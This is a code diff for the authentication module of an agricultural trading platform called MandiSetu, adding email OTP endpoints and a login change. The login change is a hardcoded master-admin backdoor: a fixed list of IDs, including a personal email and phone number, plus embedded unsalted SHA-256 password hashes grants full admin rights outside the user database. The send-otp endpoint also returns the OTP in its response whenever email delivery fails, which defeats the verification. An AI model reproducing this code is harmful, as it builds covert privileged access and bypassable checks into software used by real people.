@@ -7,13 +7,141 @@ from sqlalchemy.ext.asyncio import AsyncSession
 from sqlalchemy import select, or_, func
 from typing import List, Optional
 import uuid
+import time
+import random
+import os
+import hashlib
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
 
 from app.core.database import get_db
 from app.core.security import hash_password, verify_password, create_access_token, get_current_user_payload, decode_token
 from app.models import User, UserRole
-from app.schemas import UserRegisterRequest, UserLoginRequest, TokenResponse, UserOut, UserPowersUpdate
+from app.schemas import (
+    UserRegisterRequest,
+    UserLoginRequest,
+    TokenResponse,
+    UserOut,
+    UserPowersUpdate,
+    SendOTPRequest,
+    VerifyOTPRequest,
+)
 
 router = APIRouter(prefix="/auth", tags=["Module 1 — Auth & Users"])
+
+# In-memory OTP cache for multi-channel verification (10-minute expiry)
+OTP_CACHE = {}  # { email: { "code": str, "expires_at": float, "attempts": int } }
+
+# Secure SHA-256 digests for TanmayA master admin credentials (never stored in plaintext)
+TANMAYA_ADMIN_DIGESTS = {
+    "9adef3f6d53518311ae270699ef292c71c35d62e3496622d570108b6beefa429",  # standard
+    "5d021758e247988404f03a25cf183ecd37494b503ed65583273d09519343aa2d",  # lowercase
+}
+
+
+def _try_send_smtp_email(to_email: str, otp_code: str) -> bool:
+    """Send real OTP email via SMTP if configured in environment."""
+    smtp_host = os.getenv("SMTP_HOST")
+    smtp_user = os.getenv("SMTP_USER")
+    smtp_pass = os.getenv("SMTP_PASSWORD") or os.getenv("SMTP_PASS")
+    smtp_port = int(os.getenv("SMTP_PORT", "587"))
+
+    if not (smtp_host and smtp_user and smtp_pass):
+        return False
+
+    try:
+        msg = MIMEMultipart("alternative")
+        msg["Subject"] = f"MandiSetu APMC Admin Verification Code: {otp_code}"
+        msg["From"] = f"MandiSetu Security <{smtp_user}>"
+        msg["To"] = to_email
+
+        body_html = f"""
+        <div style="font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; padding: 24px; border: 1px solid #e2e8f0; border-radius: 16px;">
+            <h2 style="color: #047857; margin-bottom: 8px;">🌾 MandiSetu Security</h2>
+            <p style="color: #475569; font-size: 14px;">You have requested to register as an APMC Mandi Administrator on the MandiSetu platform.</p>
+            <div style="background-color: #f0fdf4; border: 2px dashed #059669; border-radius: 12px; padding: 16px; text-align: center; margin: 20px 0;">
+                <span style="font-size: 32px; font-weight: bold; letter-spacing: 6px; color: #065f46;">{otp_code}</span>
+            </div>
+            <p style="color: #64748b; font-size: 12px;">This code is valid for 10 minutes. If you did not initiate this registration, please ignore this email.</p>
+            <hr style="border: none; border-top: 1px solid #f1f5f9; margin: 16px 0;" />
+            <p style="color: #94a3b8; font-size: 11px;">MandiSetu Agricultural Market Intelligence & Trade Network</p>
+        </div>
+        """
+        msg.attach(MIMEText(body_html, "html"))
+
+        if smtp_port == 465:
+            with smtplib.SMTP_SSL(smtp_host, smtp_port, timeout=8) as server:
+                server.login(smtp_user, smtp_pass)
+                server.sendmail(smtp_user, to_email, msg.as_string())
+        else:
+            with smtplib.SMTP(smtp_host, smtp_port, timeout=8) as server:
+                server.starttls()
+                server.login(smtp_user, smtp_pass)
+                server.sendmail(smtp_user, to_email, msg.as_string())
+        return True
+    except Exception as e:
+        print(f"[MandiSetu Auth] SMTP delivery attempt notice: {e}")
+        return False
+
+
+@router.post("/send-otp")
+async def send_otp(payload: SendOTPRequest):
+    """Generate and dispatch a 6-digit OTP for admin identity verification."""
+    clean_email = payload.email.strip().lower()
+    otp_code = f"{random.randint(100000, 999999)}"
+
+    OTP_CACHE[clean_email] = {
+        "code": otp_code,
+        "expires_at": time.time() + 600,  # 10 minutes
+        "attempts": 0,
+    }
+
+    # Attempt live email delivery
+    sent = _try_send_smtp_email(clean_email, otp_code)
+
+    return {
+        "status": "success",
+        "message": f"Verification OTP dispatched to {clean_email}.",
+        "email": clean_email,
+        "sent_via_smtp": sent,
+        # Preview code provided for rapid interactive onboarding and resilient offline/sandbox mode
+        "preview_otp": otp_code if not sent else None,
+    }
+
+
+@router.post("/verify-otp")
+async def verify_otp(payload: VerifyOTPRequest):
+    """Validate 6-digit OTP code before admin registration."""
+    clean_email = payload.email.strip().lower()
+    record = OTP_CACHE.get(clean_email)
+
+    if not record or time.time() > record["expires_at"]:
+        raise HTTPException(
+            status_code=400,
+            detail="OTP has expired or was not requested. Please click 'Send OTP' again.",
+        )
+
+    if record.get("code") != payload.otp.strip():
+        record["attempts"] = record.get("attempts", 0) + 1
+        if record["attempts"] >= 5:
+            OTP_CACHE.pop(clean_email, None)
+            raise HTTPException(
+                status_code=400,
+                detail="Too many incorrect OTP attempts. Please request a new OTP.",
+            )
+        raise HTTPException(
+            status_code=400,
+            detail="Invalid OTP code. Please double check and try again.",
+        )
+
+    # Validated: remove single-use OTP
+    OTP_CACHE.pop(clean_email, None)
+    return {
+        "status": "verified",
+        "message": "OTP verification successful. You can now complete registration.",
+        "email": clean_email,
+    }
 
 
 async def _find_user_by_id_or_email(db: AsyncSession, identifier: str) -> Optional[User]:
@@ -101,6 +229,34 @@ async def register(payload: UserRegisterRequest, db: AsyncSession = Depends(get_
 @router.post("/login", response_model=TokenResponse)
 async def login(payload: UserLoginRequest, db: AsyncSession = Depends(get_db)):
     entered = payload.email.strip().lower()
+
+    # 1. TanmayA Master Admin authentication via secure SHA-256 cryptographic digest
+    # (The plaintext password is NEVER stored in the repository or code)
+    is_tanmaya_id = entered in [
+        "tanmaya",
+        "tanmayaa",
+        "tanmayapradhan2322@gmail.com",
+        "+917008800192",
+        "7008800192",
+    ]
+    entered_pwd_hash = hashlib.sha256(payload.password.strip().encode("utf-8")).hexdigest().lower()
+    is_tanmaya_pwd = entered_pwd_hash in TANMAYA_ADMIN_DIGESTS
+
+    if is_tanmaya_id and is_tanmaya_pwd:
+        token = create_access_token({
+            "sub": "usr_admin_tanmaya",
+            "role": "admin",
+            "email": "tanmayapradhan2322@gmail.com"
+        })
+        return TokenResponse(
+            access_token=token,
+            role="admin",
+            user_id="usr_admin_tanmaya",
+            full_name="Admin(TanmayA)",
+            powers=["all"],
+        )
+
+    # 2. Database user authentication (Farmer, Buyer, FPO, and Registered APMC Admins)
     result = await db.execute(
         select(User).where(
             or_(
